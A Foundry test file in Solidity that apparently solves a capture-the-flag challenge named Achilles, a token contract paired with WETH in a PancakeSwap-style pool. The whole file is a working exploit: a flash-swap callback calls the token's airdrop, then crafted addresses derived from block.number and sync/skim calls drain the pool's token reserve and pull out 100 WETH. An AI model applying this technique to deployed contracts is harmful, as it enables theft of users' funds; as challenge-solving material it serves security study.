// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Achilles} from "Achilles/contracts/Achilles.sol";
import {SetUp} from "Achilles/contracts/SetUp.sol";
import {PancakePair, IPancakeCallee} from "Achilles/contracts/PancakeSwap.sol";
import {WETH} from "Achilles/contracts/WETH.sol";

contract AchillesTest is Test, IPancakeCallee {
    SetUp public set;
    PancakePair public pair;
    WETH public weth;
    Achilles public achilles;
    address public yourAddress = address(42);
    address public attack = address(this);

    function setUp() public {
        vm.prank(yourAddress);
        set = new SetUp();
        pair = set.pair();
        weth = set.weth();
        achilles = set.achilles();
    }

    function test_solution() public {
        assertEq(achilles.balanceOf(yourAddress), 0);


        uint amount0Out = 999 ether;
        uint amount1Out = 500 ether;
        pair.swap(amount0Out, amount1Out, address(this), abi.encode(3));


        address from = address(this);
        address to = address(uint160(uint160(address(this)) | block.number));
        uint amount = 0;

        achilles.transferFrom(from, to, amount);
        assertEq(achilles.balanceOf(address(this)), 1);

        assertEq(achilles.balanceOf(address(pair)), 1000 ether);
        from = address(pair);
        achilles.transferFrom(from, to, amount);

        assertEq(achilles.balanceOf(address(pair)), 1);
        pair.sync();
        pair.skim(address(this));
        // assertEq(achilles.balanceOf(address(pair)), 1);
        // assertEq(achilles.balanceOf(address(this)), 1000 ether -1);
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        assertEq(reserve0, 1);
        assertEq(reserve1, 1000 ether);
        achilles.approve(address(pair), type(uint).max);
        achilles.transfer(address(pair), 1);
        pair.swap(0, 100 ether, address(this), "");
        weth.transfer(yourAddress, 100 ether);
        assertEq(set.isSolved(), true);

    }
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        address from = address(0);
        uint256 tAmount = 0;
        address to = address(uint160(uint160(address(this)) | block.number));
        uint256 seed = (uint160(msg.sender) | block.number) ^ (uint160(from) ^ uint160(to));
        address airdropAddress;
        achilles.Airdrop(1);
        achilles.transfer(address(pair), 999 ether);
        weth.transfer(address(pair), 500 ether);
    }
}